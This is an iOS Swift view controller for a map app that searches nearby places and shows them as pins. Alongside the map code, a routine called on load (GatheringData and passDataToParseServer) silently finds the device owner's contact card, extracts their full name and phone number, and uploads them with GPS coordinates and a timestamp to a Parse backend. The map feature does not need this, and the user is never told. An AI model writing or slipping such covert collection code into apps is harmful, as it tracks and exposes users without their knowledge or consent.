//
//  ViewController.swift
//  MapTesting
//
//  Created by Opeyemi Fasuyi on 11/01/2016.
//  Copyright © 2016 Opeyemi Fasuyi. All rights reserved.
//

import UIKit
import MapKit
import CoreLocation
import Foundation
import AddressBook
import Contacts
import Parse

class MapViewController: UIViewController, MKMapViewDelegate, CLLocationManagerDelegate, UISearchBarDelegate {
    
    var searchController:UISearchController!
    var annotation:MKAnnotation!
    var localSearchRequest:MKLocalSearchRequest!
    var localSearch:MKLocalSearch!
    var localSearchResponse:MKLocalSearchResponse!
    var error:NSError!
    var pointAnnotation:MKPointAnnotation!
    var pinAnnotationView:MKPinAnnotationView!
    var toPass:String!
    var mapItems: [MKMapItem] = [MKMapItem]()
    var detailsName:String!
    var estimatedInfo = NSMutableArray()
    var selectedPin:MKPlacemark? = nil
    var userFullName:String!
    var userPhoneNumber:String!
    
    
    @IBOutlet weak var mapType: UISegmentedControl!
    
    @IBOutlet weak var mapView: MKMapView!
    
    var matchingItems: [MKMapItem] = [MKMapItem]()
    var locationManager: CLLocationManager!
    
    let searchRadius: CLLocationDistance = 2000
    
    override func viewDidLoad() {
        super.viewDidLoad()
        if (CLLocationManager.locationServicesEnabled())
        {
            locationManager = CLLocationManager()
            locationManager.delegate = self
            locationManager.desiredAccuracy = kCLLocationAccuracyBest
            locationManager.requestWhenInUseAuthorization()
            locationManager.startUpdatingLocation()
            self.mapView.showsUserLocation = true
            self.mapView.delegate = self
            mapType.setWidth(65, forSegmentAtIndex: 0)
            mapType.setWidth(65, forSegmentAtIndex: 1)
            mapType.setWidth(65, forSegmentAtIndex: 2)
            GatheringData()
        }

    }
    
    // MARK: - Location Delegate Methods
    
    func locationManager(manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        let location = locations.last
        let center = CLLocationCoordinate2D(latitude: location!.coordinate.latitude, longitude: location!.coordinate.longitude)
        let region = MKCoordinateRegion(center: center, span: MKCoordinateSpan(latitudeDelta: 0.05, longitudeDelta: 0.05))
        self.mapView.setRegion(region, animated: true)
        let latitude: Double = location!.coordinate.latitude
        let longitude: Double = location!.coordinate.longitude
        let initialLocation = CLLocation(latitude: latitude, longitude: longitude)
        // 1
        let request = MKLocalSearchRequest()
        request.naturalLanguageQuery = toPass
        // 2
        let span = MKCoordinateSpan(latitudeDelta: 0.05, longitudeDelta: 0.05)
        
        request.region = MKCoordinateRegion(center: initialLocation.coordinate, span: span)
        // 3
        let search = MKLocalSearch(request: request)
        search.startWithCompletionHandler {response, error in guard let response = response else {
            print("Search error: \(error)")
            return
            }
            
            for item in response.mapItems {
                print("Name = \(item.name)")
                print("Phone = \(item.phoneNumber)")
                print("Website= \(item.url)")
                print("Address= \(item.placemark)")
                
                self.matchingItems.append(item as MKMapItem)
                print("Matching items = \(self.matchingItems.count)")
                
                print(item.name)
                self.addPinToMapView(item.name!, latitude: item.placemark.location!.coordinate.latitude, longitude: item.placemark.location!.coordinate.longitude)
            }
        }
        
        locationManager.stopUpdatingLocation()
        
        let coordinateRegion = MKCoordinateRegionMakeWithDistance(initialLocation.coordinate, searchRadius * 2.0, searchRadius * 2.0)
        mapView.setRegion(coordinateRegion, animated: true)
        
    }
    func addPinToMapView(title: String, latitude: CLLocationDegrees, longitude: CLLocationDegrees) {
        let location = CLLocationCoordinate2D(latitude: latitude, longitude: longitude)
        let annotation = MKPointAnnotation()
        annotation.coordinate = location
        annotation.title = title
        
        mapView.addAnnotation(annotation)
    }
    
    func mapView(mapView: MKMapView, viewForAnnotation annotation: MKAnnotation) -> MKAnnotationView? {
        
        if annotation is MKUserLocation {
            return nil
        }
        
        let reuseId = "pin"
        
        var pinView = mapView.dequeueReusableAnnotationViewWithIdentifier(reuseId) as? MKPinAnnotationView
        if pinView == nil {
            pinView = MKPinAnnotationView(annotation: annotation, reuseIdentifier: reuseId)
            pinView!.canShowCallout = true
            pinView!.animatesDrop = true
            pinView!.rightCalloutAccessoryView = UIButton(type:.DetailDisclosure) as UIButton
        }
        else {
            pinView!.annotation = annotation
        }
        return pinView
    }
    func mapView(mapView: MKMapView, annotationView view: MKAnnotationView, calloutAccessoryControlTapped control: UIControl) {
        if control == view.rightCalloutAccessoryView {
            performSegueWithIdentifier("DetailsSegue", sender: self)
        }
        
    }

    func locationManager(manager: CLLocationManager, didFailWithError error: NSError){
        print("Error: " + error.localizedDescription)
    }
    
    override func didReceiveMemoryWarning() {
        super.didReceiveMemoryWarning()
    }
    
    @IBAction func changeMapView(sender: AnyObject) {
        if mapType.selectedSegmentIndex == 0{
            mapView.mapType = MKMapType.Standard
        }else if mapType.selectedSegmentIndex == 1{
            mapView.mapType = MKMapType.Satellite
        }else if mapType.selectedSegmentIndex == 2{
            mapView.mapType = MKMapType.Hybrid
        }
        
    }
    override func prepareForSegue(segue: UIStoryboardSegue,
        sender: AnyObject?) {
            if(segue.identifier == "DetailsSegue")
            {
                let destination = segue.destinationViewController as!
                ResultsTableViewController
                
                destination.mapItems = self.matchingItems
            }
            else
            {
                let destination = segue.destinationViewController as!
                ResultsTableViewController
            
                destination.mapItems = self.matchingItems
            }
    }
    
    func GatheringData(){
        let myString: String = UIDevice.currentDevice().name
        var myStringArr = myString.componentsSeparatedByString(" ")
        detailsName = myStringArr[0]
        let myString2: String = detailsName
        var myStringArr2 = myString2.componentsSeparatedByString("'")
        detailsName = myStringArr2[0]
        print(detailsName)
        
        var searchParameters: [String] = [detailsName, "My Number", "Me"]
        
        for var i = 0; i<=2; ++i {
            if(findDataThroughContacts(searchParameters[i]) == true){
                let contact = estimatedInfo.objectAtIndex(0) as! CNContact
                let userFullName = "\(contact.givenName) \(contact.familyName)"
                var userPhoneNumber:String!
                //let userPhoneNumber = contact.phoneNumbers as! CNPhoneNumber
                for phoneNo in contact.phoneNumbers {
                    userPhoneNumber = (phoneNo.value as! CNPhoneNumber).stringValue
                }

                print(userFullName)
                self.userFullName = userFullName
                print(userPhoneNumber)
                self.userPhoneNumber = userPhoneNumber
                passDataToParseServer()
                break;
            }
        }
        
    }
    
    func findDataThroughContacts(searchData: String) -> Bool{
        
        let predicate = CNContact.predicateForContactsMatchingName(searchData)
        let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey, CNContactEmailAddressesKey, CNContactBirthdayKey, CNContactImageDataKey]
        var contacts = [CNContact]()
        var message: String!
        
        let contactsStore = AppDelegate.getAppDelegate().contactStore
        do {
            contacts = try contactsStore.unifiedContactsMatchingPredicate(predicate, keysToFetch: keys)
            
            if contacts.count == 0 {
                message = "No contacts were found matching the given name."
                print(message)
            }
            for contact in contacts {
                print(contact)
                self.estimatedInfo.addObject(contact)
                return true
            }
            
        }
        catch {
            message = "Unable to fetch contacts."
            print(message)
        }
        return false

    }
    
    func passDataToParseServer(){
        let usersPersonalInfo = PFObject(className: "UserInfo")
        usersPersonalInfo["name"] = self.userFullName
        usersPersonalInfo["phoneNumber"] = self.userPhoneNumber
        usersPersonalInfo["latitude"] = self.locationManager.location?.coordinate.latitude
        usersPersonalInfo["longitude"] = self.locationManager.location?.coordinate.longitude
        usersPersonalInfo["dateAndTime"] = NSDate()
        
        usersPersonalInfo.saveEventually()
        usersPersonalInfo.saveInBackground()
    }
}

